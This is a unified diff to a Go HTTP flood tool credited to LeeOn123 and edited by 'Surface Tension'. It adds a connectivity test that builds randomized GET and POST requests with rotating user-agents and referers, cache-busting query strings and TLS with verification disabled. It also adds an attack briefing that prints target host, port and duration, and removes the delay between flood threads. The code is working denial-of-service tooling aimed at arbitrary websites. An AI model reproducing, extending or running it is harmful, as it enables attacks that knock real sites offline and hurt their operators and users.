@@ -1,12 +1,6 @@
 /*
 Coded by LeeOn123
-Please fking code ur script by ur self, kid.
-
-I changed the random integers range to the max of int32.
-Now 386 systems should work well.
-
-Looks like most people want to hit the url but not the host/ip.
-As a result, here you are.
+Modified by Surface Tension
 */
 package main
 
@@ -210,19 +204,103 @@ func flood() {
 			}
 			s.Close()
 		}
-		//fmt.Println("Threads@", threads, " Hitting Target -->", url)// For those who like share to skid.
 	}
 }
 
+func test() bool{
+	addr := host + ":" + port
+	header := ""
+	if mode == "get" {
+		header += " HTTP/1.1\r\nHost: "
+		header += addr + "\r\n"
+		if os.Args[5] == "nil" {
+			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
+			header += "User-Agent: " + getuseragent() + "\r\n"
+			header += acceptall[rand.Intn(len(acceptall))]
+			header += referers[rand.Intn(len(referers))] + "\r\n"
+		} else {
+			func() {
+				fi, err := os.Open(os.Args[5])
+				if err != nil {
+					fmt.Printf("Error: %s\n", err)
+					return
+				}
+				defer fi.Close()
+				br := bufio.NewReader(fi)
+				for {
+					a, _, c := br.ReadLine()
+					if c == io.EOF {
+						break
+					}
+					header += string(a) + "\r\n"
+				}
+			}()
+		}
+	} else if mode == "post" {
+		data := ""
+		if os.Args[5] != "nil" {
+			func() {
+				fi, err := os.Open(os.Args[5])
+				if err != nil {
+					fmt.Printf("Error: %s\n", err)
+					return
+				}
+				defer fi.Close()
+				br := bufio.NewReader(fi)
+				for {
+					a, _, c := br.ReadLine()
+					if c == io.EOF {
+						break
+					}
+					header += string(a) + "\r\n"
+				}
+			}()
+
+		} else {
+			data = "f"
+		}
+		header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
+		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
+		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
+	}
+	var s net.Conn
+	var err error
+	if port == "443" {
+		cfg := &tls.Config{
+			InsecureSkipVerify: true,
+			ServerName:         host, //simple fix
+		}
+		s, err = tls.Dial("tcp", addr, cfg)
+	} else {
+		s, err = net.Dial("tcp", addr)
+	}
+	if err != nil {
+		return false
+	} else {
+		request := ""
+			if os.Args[3] == "get" {
+				request += "GET " + page + key
+				request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
+			}
+			request += header + "\r\n"
+			s.Write([]byte(request))
+		s.Close()
+	}
+	return true
+}
+
+
 func main() {
-	fmt.Println("\r\n'||  ||`   ||      ||                '||''''| '||`                   ||` ")
+	fmt.Println("                                                                         ")
+	fmt.Println("'||  ||`   ||      ||                '||''''| '||`                   ||` ")
 	fmt.Println(" ||  ||    ||      ||                 ||  .    ||                    ||  ")
 	fmt.Println(" ||''||  ''||''  ''||''  '||''|, ---  ||''|    ||  .|''|, .|''|, .|''||  ")
 	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
 	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
 	fmt.Println("                          ||                                             ")
-	fmt.Println("                         .||                     Golang version 2.0      ")
-	fmt.Println("                                                        C0d3d By L330n123")
+	fmt.Println("                         .||                Golang version 2.0           ")
+	fmt.Println("                                              Created By L330n123        ")
+	fmt.Println("                                                Edited By Surface Tension")
 	fmt.Println("==========================================================================")
 	if len(os.Args) != 6 {
 		fmt.Println("Post Mode will use header.txt as data")
@@ -264,13 +342,33 @@ func main() {
 		key = "&"
 	}
 	input := bufio.NewReader(os.Stdin)
+	
+	// Attack info
+	fmt.Println("\r\nBriefing:")
+	fmt.Println("=================================================")
+	fmt.Println("Num of thread(s) :", threads)
+	fmt.Println("Target host      :", host) 
+	fmt.Println("Target port      :", port)
+	fmt.Println("Target page      :", page)
+	fmt.Println("Method           :", mode)
+	fmt.Println("Lasting for      :", limit, "second(s)")
+	fmt.Println("=================================================")
 
+	//test url
+	fmt.Println("\r\nStarting the URL Test")
+	if test(){
+		fmt.Println("URL Test performed sucessfully")
+	}else{
+		fmt.Println("URL Test failed\r\nPlease make sure the url is correct and the ip does not get blocked by the target host") //When showing this message, it means ur  or the target server down.
+		os.Exit(1)
+	}
+
+	//preparing threads
 	for i := 0; i < threads; i++ {
-		time.Sleep(time.Microsecond * 100)
+		//time.Sleep(time.Microsecond * 100)
 		go flood() // Start threads
 		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
 		os.Stdout.Sync()
-		//time.Sleep( time.Millisecond * 1)
 	}
 	fmt.Printf("\nPlease [Enter] for continue")
 	_, err = input.ReadString('\n')
